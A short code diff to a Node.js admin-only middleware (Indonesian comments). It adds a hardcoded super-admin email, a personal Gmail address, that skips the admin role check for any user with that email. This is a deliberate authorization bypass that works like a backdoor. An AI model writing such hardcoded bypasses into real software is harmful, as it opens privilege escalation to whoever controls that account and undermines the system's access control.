@@ -125,12 +125,19 @@ const authorize = (...allowedRoles) => {
  * Middleware untuk admin only
  */
 const adminOnly = (req, res, next) => {
+    const SUPER_ADMIN_EMAIL = 'dharmamudita404@gmail.com';
+
     if (!req.user) {
         return res.status(401).json({
             success: false,
             message: MESSAGES.ERROR.UNAUTHORIZED,
             error: 'User tidak terautentikasi',
         });
+    }
+
+    // Bypass cek role jika email adalah SUPER ADMIN
+    if (req.user.email === SUPER_ADMIN_EMAIL) {
+        return next();
     }
 
     if (req.user.role !== USER_ROLES.ADMIN) {
